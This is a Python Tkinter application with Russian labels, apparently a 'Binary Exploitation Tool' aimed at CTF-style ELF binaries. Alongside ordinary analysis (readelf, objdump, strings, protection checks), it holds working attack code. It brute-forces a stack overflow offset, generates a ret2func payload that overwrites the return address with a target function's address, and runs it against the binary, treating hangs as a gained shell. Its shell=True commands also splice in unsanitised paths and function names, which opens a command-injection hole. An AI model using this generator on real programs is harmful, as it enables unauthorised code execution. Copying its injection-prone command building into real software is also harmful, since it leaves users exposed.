#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import subprocess
import os
import sys
import threading
import re

class BinaryExploitTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Binary Exploitation Tool")
        self.root.geometry("900x700")
        
        self.current_binary = None
        self.exploits = {}
        
        self.create_ui()
        
    def create_ui(self):
        # Создание основного фрейма
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Верхняя панель с выбором файла и кнопками
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(top_frame, text="Бинарный файл:").pack(side=tk.LEFT, padx=5)
        
        self.binary_path = tk.StringVar()
        entry = ttk.Entry(top_frame, textvariable=self.binary_path, width=50)
        entry.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(top_frame, text="Обзор...", command=self.browse_binary).pack(side=tk.LEFT, padx=5)
        ttk.Button(top_frame, text="Анализировать", command=self.analyze_binary).pack(side=tk.LEFT, padx=5)
        
        # Ноутбук (вкладки)
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Вкладка анализа
        self.analysis_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.analysis_frame, text="Анализ")
        
        # Вкладка эксплойта
        self.exploit_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.exploit_frame, text="Эксплойт")
        
        # Создание интерфейса вкладки анализа
        self.setup_analysis_tab()
        
        # Создание интерфейса вкладки эксплойта
        self.setup_exploit_tab()
        
        # Консоль для вывода
        ttk.Label(main_frame, text="Консоль:").pack(anchor=tk.W, pady=5)
        
        self.console = scrolledtext.ScrolledText(main_frame, height=10, wrap=tk.WORD)
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.config(state=tk.DISABLED)
        
    def setup_analysis_tab(self):
        frame = ttk.Frame(self.analysis_frame, padding="10")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Левая панель с кнопками анализа
        left_frame = ttk.LabelFrame(frame, text="Инструменты анализа")
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        
        ttk.Button(left_frame, text="Тип файла", command=lambda: self.run_tool("file")).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Заголовки ELF", command=lambda: self.run_tool("readelf -h")).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Секции", command=lambda: self.run_tool("readelf -S")).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Дизассемблировать", command=lambda: self.run_tool("objdump -d")).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Строки", command=lambda: self.run_tool("strings")).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Функции", command=self.list_functions).pack(fill=tk.X, pady=2, padx=5)
        ttk.Button(left_frame, text="Проверка безопасности", command=self.check_security).pack(fill=tk.X, pady=2, padx=5)
        
        # Правая панель с результатами анализа
        right_frame = ttk.Frame(frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        ttk.Label(right_frame, text="Результаты анализа:").pack(anchor=tk.W)
        
        self.analysis_text = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD)
        self.analysis_text.pack(fill=tk.BOTH, expand=True)
        self.analysis_text.config(state=tk.DISABLED)
        
    def setup_exploit_tab(self):
        frame = ttk.Frame(self.exploit_frame, padding="10")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Верхняя панель с параметрами эксплойта
        top_frame = ttk.LabelFrame(frame, text="Параметры эксплойта")
        top_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Смещение
        offset_frame = ttk.Frame(top_frame)
        offset_frame.pack(fill=tk.X, pady=5)
        ttk.Label(offset_frame, text="Смещение:").pack(side=tk.LEFT, padx=5)
        
        self.offset_var = tk.StringVar(value="76")
        ttk.Entry(offset_frame, textvariable=self.offset_var, width=10).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(offset_frame, text="Брутфорс", command=self.brute_force_offset).pack(side=tk.LEFT, padx=5)
        
        # Целевая функция
        func_frame = ttk.Frame(top_frame)
        func_frame.pack(fill=tk.X, pady=5)
        ttk.Label(func_frame, text="Целевая функция:").pack(side=tk.LEFT, padx=5)
        
        self.function_var = tk.StringVar(value="secret")
        self.function_entry = ttk.Combobox(func_frame, textvariable=self.function_var, width=20)
        self.function_entry.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(func_frame, text="Обновить", command=self.update_functions).pack(side=tk.LEFT, padx=5)
        
        # Нижняя панель с созданием и запуском эксплойта
        bottom_frame = ttk.Frame(frame)
        bottom_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        left_bottom = ttk.Frame(bottom_frame)
        left_bottom.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        ttk.Label(left_bottom, text="Код эксплойта:").pack(anchor=tk.W)
        
        self.exploit_text = scrolledtext.ScrolledText(left_bottom, wrap=tk.WORD)
        self.exploit_text.pack(fill=tk.BOTH, expand=True)
        
        right_bottom = ttk.Frame(bottom_frame)
        right_bottom.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        ttk.Label(right_bottom, text="Результаты запуска:").pack(anchor=tk.W)
        
        self.exploit_result = scrolledtext.ScrolledText(right_bottom, wrap=tk.WORD)
        self.exploit_result.pack(fill=tk.BOTH, expand=True)
        self.exploit_result.config(state=tk.DISABLED)
        
        # Кнопки операций с эксплойтом
        button_frame = ttk.Frame(frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(button_frame, text="Создать эксплойт", command=self.create_exploit).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Запустить эксплойт", command=self.run_exploit).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Сохранить эксплойт", command=self.save_exploit).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Загрузить эксплойт", command=self.load_exploit).pack(side=tk.LEFT, padx=5)
        
    def browse_binary(self):
        filename = filedialog.askopenfilename(title="Выберите бинарный файл")
        if filename:
            self.binary_path.set(filename)
            self.current_binary = filename
            self.log(f"Загружен файл: {filename}")
            
    def analyze_binary(self):
        if not self.current_binary:
            if not self.binary_path.get():
                messagebox.showerror("Ошибка", "Выберите бинарный файл для анализа")
                return
            self.current_binary = self.binary_path.get()
            
        self.log(f"Анализ файла: {self.current_binary}")
        
        # Базовый анализ бинарного файла
        self.run_tool("file")
        self.list_functions()
        self.check_security()
        
    def run_tool(self, tool_command):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        full_command = f"{tool_command} {self.current_binary}"
        self.log(f"Выполнение: {full_command}")
        
        def execute():
            try:
                process = subprocess.Popen(
                    full_command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate()
                
                result = stdout
                if stderr:
                    result += f"\nОшибки:\n{stderr}"
                    
                self.update_analysis_text(result)
                self.log(f"Команда выполнена: {tool_command}")
            except Exception as e:
                self.log(f"Ошибка выполнения команды: {str(e)}")
                messagebox.showerror("Ошибка", f"Ошибка выполнения команды: {str(e)}")
                
        thread = threading.Thread(target=execute)
        thread.daemon = True
        thread.start()
        
    def list_functions(self):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        try:
            result = subprocess.check_output(['objdump', '-d', self.current_binary], text=True)
            
            # Ищем определения функций
            function_pattern = r'<([^>+]+)>:'
            functions = re.findall(function_pattern, result)
            
            # Уникальные функции
            unique_functions = list(set(functions))
            unique_functions.sort()
            
            output = f"Найдено {len(unique_functions)} функций:\n"
            for func in unique_functions:
                output += f"- {func}\n"
                
            # Обновляем выпадающий список функций
            self.function_entry['values'] = unique_functions
                
            self.update_analysis_text(output)
            self.log(f"Найдено функций: {len(unique_functions)}")
        except Exception as e:
            self.log(f"Ошибка поиска функций: {str(e)}")
            messagebox.showerror("Ошибка", f"Ошибка поиска функций: {str(e)}")
            
    def update_functions(self):
        self.list_functions()
        
    def check_security(self):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        output = "Проверка мер безопасности:\n\n"
            
        try:
            # Проверка NX
            nx_result = subprocess.check_output(['readelf', '-l', self.current_binary], text=True)
            if "GNU_STACK" in nx_result and "RWE" in nx_result:
                output += "- Stack исполняемый (NX отключен) ❌\n"
            else:
                output += "- NX защита включена ✅\n"
                
            # Проверка на RELRO
            if "BIND_NOW" in nx_result:
                output += "- Full RELRO включен ✅\n"
            elif "RELRO" in nx_result:
                output += "- Partial RELRO включен 🟡\n"
            else:
                output += "- RELRO защита отсутствует ❌\n"
                
            # Проверка на канарейку
            canary_result = subprocess.check_output(['objdump', '-d', self.current_binary], text=True)
            if "stack_chk_fail" in canary_result:
                output += "- Stack канарейка включена ✅\n"
            else:
                output += "- Stack канарейка отсутствует ❌\n"
                
            # Проверка на ASLR (системная настройка)
            aslr_result = subprocess.check_output(['cat', '/proc/sys/kernel/randomize_va_space'], text=True).strip()
            if aslr_result == "2":
                output += "- ASLR полностью включен ✅\n"
            elif aslr_result == "1":
                output += "- ASLR частично включен 🟡\n"
            else:
                output += "- ASLR отключен ❌\n"
                
            # Проверка на PIE
            file_result = subprocess.check_output(['file', self.current_binary], text=True)
            if "position-independent executable" in file_result.lower():
                output += "- PIE включен ✅\n"
            else:
                output += "- PIE отключен ❌\n"
                
            self.update_analysis_text(output)
            self.log("Проверка мер безопасности завершена")
        except Exception as e:
            self.log(f"Ошибка проверки безопасности: {str(e)}")
            messagebox.showerror("Ошибка", f"Ошибка проверки безопасности: {str(e)}")
            
    def brute_force_offset(self):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        target_function = self.function_var.get()
        if not target_function:
            messagebox.showerror("Ошибка", "Выберите целевую функцию")
            return
            
        self.log(f"Брутфорс смещения для функции {target_function}...")
        
        def execute():
            try:
                # Получаем адрес целевой функции
                result = subprocess.check_output(
                    f"objdump -d {self.current_binary} | grep -A 1 '<{target_function}>'", 
                    shell=True, 
                    text=True
                )
                address = int(result.split('\n')[0].strip().split(' ')[0], 16)
                
                output = f"Начало брутфорса смещения для функции {target_function} (адрес: 0x{address:08x})...\n\n"
                self.update_exploit_result(output)
                
                # Пробуем разные смещения
                start_offset = 64
                end_offset = 100
                
                for offset in range(start_offset, end_offset):
                    payload = b"A" * offset
                    payload += address.to_bytes(4, 'little')
                    
                    with open("exploit_input_temp", "wb") as f:
                        f.write(payload)
                        
                    self.update_exploit_result(f"{output}Проверка смещения: {offset}...")
                    
                    try:
                        result = subprocess.run(
                            f"{self.current_binary} < exploit_input_temp", 
                            shell=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE,
                            timeout=1
                        )
                        
                        if b"Access granted" in result.stdout or b"Exploit successful" in result.stdout:
                            self.offset_var.set(str(offset))
                            self.update_exploit_result(f"{output}Успех! Найдено корректное смещение: {offset}")
                            self.log(f"Найдено смещение: {offset}")
                            return
                    except subprocess.TimeoutExpired:
                        # Если таймаут истек, возможно, мы получили shell
                        self.offset_var.set(str(offset))
                        self.update_exploit_result(f"{output}Возможное смещение найдено: {offset} (программа зависла, что может указывать на успешное получение shell)")
                        self.log(f"Возможное смещение: {offset}")
                        return
                        
                self.update_exploit_result(f"{output}Не удалось найти корректное смещение в диапазоне {start_offset}-{end_offset}")
                self.log("Брутфорс смещения не удался")
            except Exception as e:
                self.log(f"Ошибка брутфорса смещения: {str(e)}")
                messagebox.showerror("Ошибка", f"Ошибка брутфорса смещения: {str(e)}")
                
        thread = threading.Thread(target=execute)
        thread.daemon = True
        thread.start()
        
    def create_exploit(self):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        try:
            offset = int(self.offset_var.get())
        except ValueError:
            messagebox.showerror("Ошибка", "Укажите корректное смещение (число)")
            return
            
        target_function = self.function_var.get()
        if not target_function:
            messagebox.showerror("Ошибка", "Выберите целевую функцию")
            return
            
        self.log(f"Создание эксплойта для функции {target_function} со смещением {offset}...")
        
        try:
            # Получаем адрес целевой функции
            result = subprocess.check_output(
                f"objdump -d {self.current_binary} | grep -A 1 '<{target_function}>'", 
                shell=True, 
                text=True
            )
            address = int(result.split('\n')[0].strip().split(' ')[0], 16)
            
            # Создаем код эксплойта
            exploit_code = f"""#!/usr/bin/env python3
import struct

# Параметры эксплойта
offset = {offset}  # смещение до перезаписи EIP
target_addr = 0x{address:08x}  # адрес функции {target_function}

# Создаем полезную нагрузку
payload = b"A" * offset  # заполнение буфера
payload += struct.pack("<I", target_addr)  # адрес функции в little-endian

# Записываем эксплойт в файл
with open("exploit_input", "wb") as f:
    f.write(payload)
    
print(f"Эксплойт создан и сохранен в файл 'exploit_input'")
print(f"Запустите уязвимый бинарный файл: ./{os.path.basename(self.current_binary)} < exploit_input")
"""
            
            self.exploit_text.delete(1.0, tk.END)
            self.exploit_text.insert(tk.END, exploit_code)
            
            # Запоминаем эксплойт для этого файла
            self.exploits[self.current_binary] = {
                'offset': offset,
                'target_function': target_function,
                'address': address,
                'code': exploit_code
            }
            
            self.log("Эксплойт создан")
        except Exception as e:
            self.log(f"Ошибка создания эксплойта: {str(e)}")
            messagebox.showerror("Ошибка", f"Ошибка создания эксплойта: {str(e)}")
            
    def run_exploit(self):
        if not self.current_binary:
            messagebox.showerror("Ошибка", "Выберите бинарный файл")
            return
            
        exploit_code = self.exploit_text.get(1.0, tk.END)
        if not exploit_code.strip():
            messagebox.showerror("Ошибка", "Сначала создайте эксплойт")
            return
            
        self.log("Запуск эксплойта...")
        
        def execute():
            try:
                # Сохраняем код эксплойта во временный файл
                with open("temp_exploit.py", "w") as f:
                    f.write(exploit_code)
                    
                # Запускаем эксплойт
                subprocess.check_call(["python3", "temp_exploit.py"])
                
                # Запускаем уязвимый бинарный файл с созданным эксплойтом
                try:
                    result = subprocess.run(
                        f"{self.current_binary} < exploit_input", 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        timeout=2,
                        text=True
                    )
                    
                    output = "Результаты запуска эксплойта:\n\n"
                    output += result.stdout
                    
                    if result.stderr:
                        output += f"\nОшибки:\n{result.stderr}"
                        
                    self.update_exploit_result(output)
                except subprocess.TimeoutExpired:
                    # Если произошел таймаут, возможно, мы получили shell
                    self.update_exploit_result("Эксплойт, возможно, успешно выполнен (программа зависла, что может указывать на успешное получение shell)")
                    
                self.log("Эксплойт запущен")
            except Exception as e:
                self.log(f"Ошибка запуска эксплойта: {str(e)}")
                messagebox.showerror("Ошибка", f"Ошибка запуска эксплойта: {str(e)}")
                
        thread = threading.Thread(target=execute)
        thread.daemon = True
        thread.start()
        
    def save_exploit(self):
        exploit_code = self.exploit_text.get(1.0, tk.END)
        if not exploit_code.strip():
            messagebox.showerror("Ошибка", "Нет эксплойта для сохранения")
            return
            
        filename = filedialog.asksaveasfilename(
            title="Сохранить эксплойт",
            defaultextension=".py",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")]
        )
        
        if filename:
            with open(filename, "w") as f:
                f.write(exploit_code)
                
            self.log(f"Эксплойт сохранен в файл: {filename}")
            
    def load_exploit(self):
        filename = filedialog.askopenfilename(
            title="Загрузить эксплойт",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")]
        )
        
        if filename:
            with open(filename, "r") as f:
                exploit_code = f.read()
                
            self.exploit_text.delete(1.0, tk.END)
            self.exploit_text.insert(tk.END, exploit_code)
            
            self.log(f"Эксплойт загружен из файла: {filename}")
            
    def log(self, message):
        """Добавляет сообщение в консоль лога"""
        self.console.config(state=tk.NORMAL)
        self.console.insert(tk.END, f"[*] {message}\n")
        self.console.see(tk.END)
        self.console.config(state=tk.DISABLED)
        
    def update_analysis_text(self, text):
        """Обновляет текст в поле анализа"""
        self.analysis_text.config(state=tk.NORMAL)
        self.analysis_text.delete(1.0, tk.END)
        self.analysis_text.insert(tk.END, text)
        self.analysis_text.see(tk.END)
        self.analysis_text.config(state=tk.DISABLED)
        
    def update_exploit_result(self, text):
        """Обновляет текст в поле результатов эксплойта"""
        self.exploit_result.config(state=tk.NORMAL)
        self.exploit_result.delete(1.0, tk.END)
        self.exploit_result.insert(tk.END, text)
        self.exploit_result.see(tk.END)
        self.exploit_result.config(state=tk.DISABLED)

def main():
    root = tk.Tk()
    app = BinaryExploitTool(root)
    root.mainloop()

if __name__ == "__main__":
    main() 